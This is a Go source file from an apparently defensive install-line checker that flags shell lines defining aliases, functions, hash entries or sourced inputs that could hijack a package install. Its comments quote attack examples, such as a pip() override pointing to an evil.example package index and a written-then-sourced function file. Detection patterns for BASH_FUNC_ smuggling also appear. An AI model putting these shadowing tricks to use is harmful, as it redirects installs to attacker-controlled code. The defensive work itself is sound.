package installread

import (
	"path"
	"regexp"
	"strings"
)

// READER-SHADOW-1 (ADR-0159 rounds 18 and 19): a line that defines an alias or a function can change what its own
// install runs — `pip() { command pip --index-url https://evil.example/simple "$@"; }; pip install zz-pkg` installs
// from another index while both readers read the plain install of pip. Since round 19 the rule is a class, not a list
// of names: a line that installs and defines anything a shell resolves a command through holds, whatever the name —
// a name() definition, function, alias (an alias whose value installs holds on its own), autoload, hash -p or
// hash name=path, enable, shopt -s expand_aliases, source or . reading its input (a here-string, a here-document,
// /dev/stdin, /dev/fd/N, /proc/…/fd/N), an assignment to the shells' tables (BASH_ALIASES, BASH_CMDS, zsh's
// aliases, functions, commands …) and BASH_FUNC_ anywhere in the line (bash imports a function from the environment).
// The walk finds them with the line reader's own tokenizer (splitShell), which knows $'…', comments and
// here-documents; the raw line is scanned for BASH_FUNC_ and the table names, which hide in quoted env words. source
// <( … ) is read as sourcing a file is: through what the line shows of it (source <(echo 'pip() { … }') — the walk
// reads the echoed script, and its definitions count, READER-SHELLS); source <(cat .env) shows none, as source .env.

// whyShadow: the reason for a line that installs and defines an alias or a function.
const whyShadow = "defines an alias or a function on a line that installs, which can change what the install runs"

// shadowRaw: what the raw line shows of a definition the walk may not see as a command: bash's exported functions
// (env 'BASH_FUNC_pip%%=() { … }' bash -c …), its alias and command tables, and an assignment to zsh's tables.
var shadowRaw = regexp.MustCompile(`BASH_FUNC_|BASH_ALIASES|BASH_CMDS|(?:^|[\s;&|(){}'"])(?:dis_)?(?:[gs]?aliases|functions|commands)(?:\[|\+?=)`)

// shadowTables: the zsh tables a declaration word can name whole (typeset -A aliases, read -A functions, set -A …).
var shadowTables = wordSet("aliases galiases saliases dis_aliases dis_galiases dis_saliases functions dis_functions commands")

// shadowDecl: the commands whose words assign the variables they name.
var shadowDecl = wordSet("typeset declare local readonly export read set integer float vared")

// stdinPath: a file name that is the command's own input or one of its descriptors (source /dev/stdin <<< '…').
var stdinPath = regexp.MustCompile(`^(?:/dev/stdin|/dev/fd/[0-9]+|/proc/[^/]+/fd/[0-9]+)$`)

// def records the first definition the line makes (READER-SHADOW-1).
func (p *hookParse) def(what string) {
	if p.defined == "" && what != "" {
		p.defined = what
	}
}

// shadowTable: a variable name (NAME, NAME[key], NAME+) that is one of the shells' alias, function or command tables,
// or a function bash imports from the environment.
func shadowTable(k string) bool {
	k, _, _ = strings.Cut(strings.TrimSuffix(k, "+"), "[")
	return shadowTables[k] || k == "BASH_ALIASES" || k == "BASH_CMDS" || strings.HasPrefix(k, "BASH_FUNC_")
}

// segDefines: what one segment of the tokenizer defines — the name before (), function NAME, or a source of the
// command's input — or "".
func segDefines(sg shellSeg) string {
	switch {
	case sg.def != "":
		return sg.def + "()"
	case len(sg.words) > 0 && sg.words[0] == "function":
		return strings.Join(sg.words[:min(2, len(sg.words))], " ")
	}
	cmd, rest := unwrapped(sg.words)
	if cmd != "source" && cmd != "." {
		return ""
	}
	if len(sg.here) > 0 || sg.doc {
		return cmd + " of its input"
	}
	for _, w := range rest {
		if stdinPath.MatchString(w) {
			return cmd + " " + w
		}
	}
	return ""
}

// noteDefs: what one simple command defines (alias, hash, enable, autoload, shopt -s expand_aliases, the tables
// through the assignment words or a declaration). An alias whose value installs holds on its own: the alias can run
// under any name (alias x='pip install …'; x zz-pkg).
func (p *hookParse) noteDefs(cmd string, rest, assigns []string, depth int) {
	for _, a := range assigns {
		if k, _, _ := strings.Cut(a, "="); shadowTable(k) {
			p.def(k)
		}
	}
	switch {
	case cmd == "alias":
		for _, w := range rest {
			k, v, ok := strings.Cut(w, "=")
			if !ok || strings.HasPrefix(k, "-") {
				continue
			}
			p.def("alias " + k)
			q := &hookParse{seen: map[string]bool{}}
			if q.line(v, depth+1); len(q.targets)+len(q.unread) > 0 || q.hits > 0 {
				p.miss(whyShadow + " (alias " + clip(k, 40) + ": " + clip(v, 60) + ")")
			}
		}
	case cmd == "hash":
		for _, w := range rest {
			if w == "-p" || strings.Contains(w, "=") { // bash hash -p PATH NAME, zsh hash NAME=PATH
				p.def("hash " + strings.Join(rest, " "))
			}
		}
	case cmd == "enable" || cmd == "autoload":
		if len(rest) > 0 {
			p.def(cmd + " " + strings.Join(rest, " "))
		}
	case posixShells[cmd]:
		// bash --rcfile FILE and --init-file FILE run FILE before the command: the option form of BASH_ENV (round 20)
		for _, w := range rest {
			if w == "--rcfile" || w == "--init-file" || strings.HasPrefix(w, "--rcfile=") || strings.HasPrefix(w, "--init-file=") {
				p.def(cmd + " " + w)
			}
			if !strings.HasPrefix(w, "-") || w == "-c" || w == "--" {
				break // the script, a -c script or the end of the options: its own words follow
			}
		}
	case cmd == "shopt":
		for _, w := range rest {
			if w == "expand_aliases" {
				p.def("shopt expand_aliases")
			}
		}
	case shadowDecl[cmd]:
		for _, w := range rest {
			if k, _, _ := strings.Cut(w, "="); shadowTable(k) {
				p.def(cmd + " " + w)
			}
		}
	}
}

// Defines is what a line defines that a shell resolves a command through — the first alias, function, hash entry,
// sourced input or table assignment the line reader finds — or "": alalanet-agent's requirements-file reader holds on
// it as the line reader does on a line that installs (READER-SHADOW-1).
func Defines(line string) string {
	if lineTooLong(line) {
		return ""
	}
	p := &hookParse{seen: map[string]bool{}}
	line = whichSubst.ReplaceAllString(line, "$1$2")
	p.line(line, 0)
	p.defRaw(line)
	return p.defined
}

// defRaw records a definition the raw line shows (shadowRaw).
func (p *hookParse) defRaw(line string) {
	if m := shadowRaw.FindString(line); m != "" {
		p.def(strings.TrimLeft(m, " \t\r\n;&|(){}'\""))
	}
}

// SourcedFileNotRead: install_check's fact (an info code, which holds nothing) for a line that installs and sources a
// file (source FILE, . FILE): what the file defines — a function or an alias named like the install's command — is not
// in the answer. alalanet-agent reads the file on the machine (ADR-0159 round 20, the coordinator's decision).
const SourcedFileNotRead = "sourced_file_not_read"

// CommandSourcedFile: the file a source or . command reads, as written ("" when c is none or names none). A first
// word that is an option is returned as it is: the agent holds on it.
func CommandSourcedFile(c Command) string {
	if c.Prog != "source" && c.Prog != "." || len(c.Words) < 2 {
		return ""
	}
	w := c.Words[1:]
	if w[0] == "--" {
		w = w[1:]
	}
	if len(w) == 0 {
		return ""
	}
	return w[0]
}

// SourcedFiles: the files a line that installs sources, as written, in order (none when the line installs nothing);
// SourcedOutput stands for the output of a command (source <( … )), which no reader reads. A source of the command's
// own input (/dev/stdin, /dev/fd/N, /proc/…/fd/N, a here-string or a here-document) is no file here: it is a
// definition, which holds (Defines).
func SourcedFiles(line string) []string {
	if lineTooLong(line) {
		return nil
	}
	var files []string
	p := &hookParse{seen: map[string]bool{}, srcs: &files}
	p.line(whichSubst.ReplaceAllString(line, "$1$2"), 0)
	if len(p.targets) == 0 && p.hits == 0 {
		return nil
	}
	return files
}

// SourcedOutput: SourcedFiles' word for a source of a command's output (source <( … ), . <( … )).
const SourcedOutput = "<( … )"

// segSourced: the file one segment sources (source FILE, . FILE), SourcedOutput for a source of a process
// substitution, or "" — none, or a source of the command's own input (segDefines).
func segSourced(sg shellSeg) string {
	cmd, rest := unwrapped(sg.words)
	if cmd != "source" && cmd != "." || segDefines(sg) != "" {
		return ""
	}
	if len(rest) > 0 && rest[0] == "--" {
		rest = rest[1:]
	}
	switch {
	case len(rest) > 0:
		return rest[0]
	case sg.proc:
		return SourcedOutput
	}
	return ""
}

// LineFacts: install_check's facts for a line, which hold nothing: ReqFileNotRead when it names a requirements-format
// file, SourcedFileNotRead when it installs and sources a file.
func LineFacts(line string) []string {
	var out []string
	if f := RequirementFilesFact(line); f != "" {
		out = append(out, f)
	}
	if len(SourcedFiles(line)) > 0 {
		out = append(out, SourcedFileNotRead)
	}
	return out
}

// Round 21 (P2-J): a file the line itself writes and then sources — echo 'pip() {…}' > new.sh && . ./new.sh && pip
// install … — is missing when alalanet-agent reads, and defines what the install runs. The line reader holds a source
// of a file an earlier command of the line writes by name (a redirection to it, cp, mv, ln or install to it or into
// its folder, tee, curl -o, wget -O, sed -i, dd of=), or after one that writes files it does not name (tar, git,
// unzip, rsync, patch, wget, curl -O, a copy into a folder or of a tree) — except a venv's bin/activate that an
// earlier python -m venv, virtualenv or uv venv of the line creates (venvCreated) with nothing in between that may
// write into it: any command that is not harmless and installs nothing the readers read clears that. VenvActivates
// and SourcedUnwritten name what the agent may find missing and stay silent on; any other sourced file that is not
// there holds.

// sourcedAfterWrite: the definition a segment that sources a file makes when an earlier command wrote it.
func (p *hookParse) sourcedAfterWrite(sg shellSeg) {
	f := segSourced(sg)
	if f == "" || f == SourcedOutput {
		return
	}
	// round 22: a substitution among its own words the walk read apart (cut) runs before it, and a venv tool writes
	// into the folder it makes: neither is "before any write"
	if !p.mayWrite && !sg.cut && !p.inCreated(f) && p.unw != nil {
		*p.unw = append(*p.unw, f)
	}
	if v, ok := p.venvActivate(f); ok {
		if p.acts != nil {
			*p.acts = append(*p.acts, VenvActivate{File: f, Clear: v.clear})
		}
		return
	}
	if p.wrote || p.written[path.Clean(f)] {
		p.def("source " + f + " after a command that writes it")
	}
}

// madeVenv: a folder a venv tool of the line creates, and whether the tool empties it first (--clear).
type madeVenv struct {
	dir   string
	clear bool
}

// venvActivate: f is the bin/activate of a venv an earlier command of the line created, nothing since writing into it.
func (p *hookParse) venvActivate(f string) (madeVenv, bool) {
	for _, d := range p.venvs {
		if path.Clean(f) == path.Join(path.Clean(d.dir), "bin", "activate") {
			return d, true
		}
	}
	return madeVenv{}, false
}

// inCreated: f is inside a folder a venv tool of the line creates.
func (p *hookParse) inCreated(f string) bool {
	c := path.Clean(f)
	for _, d := range p.created {
		if d := path.Clean(d); c == d || strings.HasPrefix(c, d+"/") || d == "." {
			return true
		}
	}
	return false
}

// quotedSubsts: the substitutions in a segment's words that the walk does not read as commands (inside double quotes,
// ${ … }, $(( … ))) run before the segment: each is walked apart, and one that may write — anything but harmless
// commands and installs the readers read, or one that does not close — counts as a write of the line (round 22); one
// past the walk's budget, or the bounds of substTrack, counts as a write unread (round 23).
func (p *hookParse) quotedSubsts(sg shellSeg, depth int) {
	for _, b := range sg.qsubs {
		if p.substLeft == nil {
			left := maxSubstWalk
			p.substLeft = &left
		}
		q := &hookParse{seen: map[string]bool{}, substLeft: p.substLeft}
		b, plain := strings.CutPrefix(b, unplain)
		plain = !plain
		walk := b != "?" && depth < 4 && len(b) <= *p.substLeft // round 23: one budget for the whole reading
		if walk {
			*p.substLeft -= len(b)
			q.line(b, depth+1)
			p.work += q.work
			p.walked += len(b) + q.walked
		}
		if walk && plain && !q.mayWrite {
			continue
		}
		p.mayWrite, p.venvs = true, nil
		p.wrote = p.wrote || q.wrote
		p.goWrites = append(p.goWrites, q.goWrites...)
		for n := range q.written {
			if p.written == nil {
				p.written = map[string]bool{}
			}
			p.written[n] = true
		}
	}
}

// Round 23 (P2-Q, P2-P): the substitutions the walk does not read as commands are followed in the tokenizer's one
// pass (substTrack) — each body's end found by the parentheses and single quotes seen on the way, never by a scan of
// its own — and bounded: past maxSubsts substitutions in a line, or maxSubstDepth nested, the line counts one write
// ("?") and follows no more; a body that holds a here-document (<<), a comment (#), a new line or a case — whose ")"
// the count cannot place — counts as a write too. The bodies are walked with a budget shared by the whole reading
// (maxSubstWalk bytes); past it, a body counts as a write unread.
const (
	maxSubsts     = 64
	maxSubstDepth = 8
	maxSubstWalk  = 64 << 10
)

// substUnplaced: a body whose end the count of parentheses cannot be sure of.
// Round 24 (P2-R): a backslash (\) escapes a parenthesis or a quote the count would take, and $'…' has escapes of its
// own ($'\')' is the text ')): a body with either counts as a write too.
var substUnplaced = regexp.MustCompile(`<<|#|\n|\\|\$'|(?:^|[^A-Za-z0-9_])case(?:$|[^A-Za-z0-9_])`)

// unplain marks a recorded body that counts as a write whatever its reading says (substPlain).
const unplain = "\x00"

// substPlain: a body the count of parentheses and single quotes reads as the shell does — round 25 (P2-S), the
// class rule after three rounds of cases: every character a letter, a digit, a blank or one of -_./:=,+@%, with
// parentheses and single quotes balanced, and every character in single quotes on the list too. Anything else ($, {,
// }, ", a backtick, \, #, <, >, |, ;, &, a new line …) can make a ")" mean something other than the end of the body,
// so such a body counts as a write. Under it, substUnplaced is redundant (its <<, #, new line, \ and $' are all off
// the list; case is a word of the list, but a body cut at a case arm's ")" is no harmless command), and kept as it was.
func substPlain(body string) bool {
	depth, sq := 0, false
	for _, c := range body {
		switch {
		case c == '\'':
			sq = !sq
		case c == '(' || c == ')':
			// parentheses in single quotes are text; outside them they must balance
			if sq {
				continue
			}
			if c == '(' {
				depth++
			} else if depth--; depth < 0 {
				return false
			}
		case c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || c == ' ' || c == '\t' ||
			strings.ContainsRune("-_./:=,+@%", c):
		default:
			return false // in single quotes as well: the list is of every character
		}
	}
	return depth == 0 && !sq
}

// substTrack follows the open substitutions of one quoted string or ${ … }: each $( … )'s body start, its own
// parentheses and whether a single quote is open in it, innermost last; an open backtick body's start.
type substTrack struct {
	open []substOpen
	bt   int // the start of an open backtick body, 0 when none (a body never starts at 0)
	skip int // the index of the "(" of the last $( pushed
	n    int // substitutions seen in the line
	over bool
	// copied: the bytes of the bodies recorded, for the work count (round 24, P3-V)
	copied int
}

type substOpen struct {
	start, depth int
	sq           bool
}

// record a body, or "?" for one the count cannot place.
func (st *substTrack) record(body string, qsubs []string) []string {
	if st.over {
		return qsubs
	}
	st.copied += len(body)
	if substUnplaced.MatchString(body) || !substPlain(body) {
		body = unplain + body // a write; still walked for the names it writes (the line reader's hold)
	}
	return append(qsubs, body)
}

// bound: one more substitution; past the bounds the line has one "?" and nothing more is followed.
func (st *substTrack) bound(qsubs []string) ([]string, bool) {
	if st.over {
		return qsubs, false
	}
	if st.n++; st.n > maxSubsts || len(st.open) >= maxSubstDepth {
		st.over, st.open, st.bt = true, nil, 0
		return append(qsubs, "?"), false
	}
	return qsubs, true
}

// push a $( at rs[i].
func (st *substTrack) push(rs []rune, i int, qsubs []string) []string {
	if len(st.open) > 0 && st.open[len(st.open)-1].sq {
		return qsubs // inside single quotes: text
	}
	qsubs, ok := st.bound(qsubs)
	if ok {
		st.open = append(st.open, substOpen{start: i + 2})
		st.skip = i + 1
	}
	return qsubs
}

// justPushed: rs[i] is the "(" of the $( just pushed.
func (st *substTrack) justPushed(i int) bool { return st.skip == i && len(st.open) > 0 }

// tick: a backtick at rs[i] opens a body or closes the open one.
func (st *substTrack) tick(rs []rune, i int, qsubs []string) []string {
	if st.bt > 0 {
		qsubs = st.record(string(rs[st.bt:i]), qsubs)
		st.bt = 0
		return qsubs
	}
	qsubs, ok := st.bound(qsubs)
	if ok {
		st.bt = i + 1
	}
	return qsubs
}

// char: a parenthesis or a single quote inside an open $( … ).
func (st *substTrack) char(rs []rune, i int, qsubs []string) []string {
	if len(st.open) == 0 {
		return qsubs
	}
	top := &st.open[len(st.open)-1]
	switch c := rs[i]; {
	case c == '\'':
		top.sq = !top.sq
	case top.sq:
	case c == '(':
		top.depth++
	case c == ')' && top.depth > 0:
		top.depth--
	case c == ')':
		qsubs = st.record(string(rs[top.start:i]), qsubs)
		st.open = st.open[:len(st.open)-1]
	}
	return qsubs
}

// end: the quoted string or ${ … } ends; what is still open there counts as a write.
func (st *substTrack) end(_ []rune, qsubs []string) []string {
	if (len(st.open) > 0 || st.bt > 0) && !st.over {
		qsubs = append(qsubs, "?")
	}
	st.open, st.bt = nil, 0
	return qsubs
}

// noteWrites updates what the line has written after one segment: a venv tool's folders (venvCreated); the files a
// command writes (writesFiles: a later source of one holds, of any when it writes files it does not name); any other
// command that is neither harmless nor an install the readers read may write too (mayWrite), into a venv as well.
func (p *hookParse) noteWrites(sg shellSeg, installs bool) {
	if dirs, clear, ok := venvCreated(sg.words); ok {
		p.created = append(p.created, dirs...)
		if !sg.writes {
			for _, d := range dirs {
				p.venvs = append(p.venvs, madeVenv{d, clear})
			}
			return
		}
	}
	p.noteGoWrites(sg) // ECO-1 Go, rounds 4–5: the writes before a go install or go run
	names, any := writesFiles(sg.words)
	names = append(names, sg.outs...)
	if len(names) > 0 || any {
		if p.written == nil {
			p.written = map[string]bool{}
		}
		for _, n := range names {
			p.written[path.Clean(n)] = true
		}
		p.wrote = p.wrote || any
		p.mayWrite, p.venvs = true, nil
		return
	}
	if !installs && !harmless(sg.words) {
		p.mayWrite, p.venvs = true, nil
	}
}

// writesFiles: the files a command writes by name, and whether it writes others it does not name: cp, mv, ln and
// install (the destination, and the sources' names inside it; a tree or -t: any), tee, sed -i, dd of=, curl -o and
// wget -O by name; tar, git, unzip, rsync, patch, wget and curl -O any.
func writesFiles(words []string) (names []string, any bool) {
	cmd, rest := unwrapped(words)
	var args []string
	opt := func(w string, flags string) bool {
		return len(w) > 1 && w[0] == '-' && w[1] != '-' && strings.ContainsAny(w[1:], flags)
	}
	switch cmd {
	case "tar", "git", "unzip", "rsync", "patch":
		return nil, true
	case "cp", "mv", "ln", "install":
		for _, w := range rest {
			switch {
			case w == "-t" || strings.HasPrefix(w, "--target-directory") || opt(w, "rRaT") || w == "--recursive" || w == "--archive":
				return nil, true
			case !strings.HasPrefix(w, "-"):
				args = append(args, w)
			}
		}
		if len(args) == 0 {
			return nil, false
		}
		dest := args[len(args)-1]
		names = append(names, dest)
		for _, src := range args[:len(args)-1] {
			names = append(names, path.Join(dest, path.Base(src)))
		}
		return names, false
	case "tee", "sed":
		inPlace := cmd == "tee"
		for _, w := range rest {
			switch {
			case cmd == "sed" && (strings.HasPrefix(w, "-i") || strings.HasPrefix(w, "--in-place") || opt(w, "i")):
				inPlace = true
			case !strings.HasPrefix(w, "-"):
				args = append(args, w)
			}
		}
		if !inPlace {
			return nil, false
		}
		return args, false
	case "dd":
		for _, w := range rest {
			if v, ok := strings.CutPrefix(w, "of="); ok {
				names = append(names, v)
			}
		}
		return names, false
	case "curl", "wget":
		for i, w := range rest {
			switch {
			case cmd == "curl" && (w == "-o" || w == "--output") || cmd == "wget" && (w == "-O" || w == "--output-document"):
				if i+1 < len(rest) {
					names = append(names, rest[i+1])
				}
			case cmd == "curl" && (strings.HasPrefix(w, "--output=") || strings.HasPrefix(w, "-o") && len(w) > 2):
				names = append(names, strings.TrimPrefix(strings.TrimPrefix(w, "--output="), "-o"))
			case cmd == "wget" && (strings.HasPrefix(w, "--output-document=") || strings.HasPrefix(w, "-O") && len(w) > 2):
				names = append(names, strings.TrimPrefix(strings.TrimPrefix(w, "--output-document="), "-O"))
			case cmd == "curl" && (strings.HasPrefix(w, "--remote-name") || strings.HasPrefix(w, "--output-dir") || opt(w, "O")):
				return nil, true
			}
		}
		if cmd == "wget" && len(names) == 0 {
			return nil, true // wget saves under the URL's name
		}
		return names, false
	}
	return nil, false
}

// venvCreated: the folders a command that only makes a venv creates — python[N.M] -m venv DIR…, py -m venv DIR…,
// virtualenv DIR…, uv venv [DIR] (.venv when none) — run by its bare name, with the interpreter its own (no -p or
// --python of virtualenv and uv; a path in its first word is no such name): the files it writes there are the
// tool's. ok false for any other command.
func venvCreated(words []string) (dirs []string, clear, ok bool) {
	if len(words) == 0 {
		return nil, false, false
	}
	name, rest := strings.ToLower(words[0]), words[1:]
	var takes map[string]bool
	switch {
	case (name == "py" || strings.HasPrefix(name, "python") && strings.Trim(name[len("python"):], "0123456789.") == "") &&
		len(rest) >= 2 && rest[0] == "-m" && rest[1] == "venv":
		rest, takes = rest[2:], wordSet("--prompt")
	case name == "virtualenv":
		takes = wordSet("--prompt --creator --seeder --activators --app-data --extra-search-dir --discovery --pip --setuptools --wheel --try-first-with")
	case name == "uv" && len(rest) >= 1 && rest[0] == "venv":
		rest, takes = rest[1:], wordSet("--prompt --index-url --extra-index-url --find-links --index --default-index --cache-dir --config-file --link-mode --index-strategy --keyring-provider --exclude-newer --allow-insecure-host --color")
		defer func() {
			if ok && len(dirs) == 0 {
				dirs = []string{".venv"}
			}
		}()
	default:
		return nil, false, false
	}
	for i := 0; i < len(rest); i++ {
		w := rest[i]
		k, _, _ := strings.Cut(w, "=")
		switch {
		case k == "-p" || k == "--python" || strings.HasPrefix(w, "-p") && len(w) > 2 && w[1] != '-' ||
			k == "--directory" || k == "--project":
			return nil, false, false // an interpreter or a folder of the line's choosing
		case takes[w]:
			i++
		case w == "--clear":
			clear = true
		case strings.HasPrefix(w, "-"):
		default:
			dirs = append(dirs, w)
		}
	}
	return dirs, clear, true
}

// VenvActivate: a venv's bin/activate a line sources (File, as written), made by a venv tool of the line before it;
// Clear: the tool empties the folder first (--clear), so nothing that was there before stays.
type VenvActivate struct {
	File  string
	Clear bool
}

// VenvActivates: the files a line sources that are the bin/activate of a venv an earlier command of the line itself
// creates (venvCreated), with nothing in between that may write into it — missing when the hook reads, and the venv
// tool's own when the line runs (round 21).
func VenvActivates(line string) []VenvActivate {
	if lineTooLong(line) {
		return nil
	}
	var acts []VenvActivate
	p := &hookParse{seen: map[string]bool{}, acts: &acts}
	p.line(whichSubst.ReplaceAllString(line, "$1$2"), 0)
	return acts
}

// SourcedUnwritten: the files a line sources before any command of it that may write a file (one that is neither
// harmless nor an install the readers read, other than a venv tool): one of them that is not there when the hook reads
// is not there when the line sources it either — the shell loads nothing (round 21).
func SourcedUnwritten(line string) []string {
	if lineTooLong(line) {
		return nil
	}
	var unw []string
	p := &hookParse{seen: map[string]bool{}, unw: &unw}
	p.line(whichSubst.ReplaceAllString(line, "$1$2"), 0)
	return unw
}
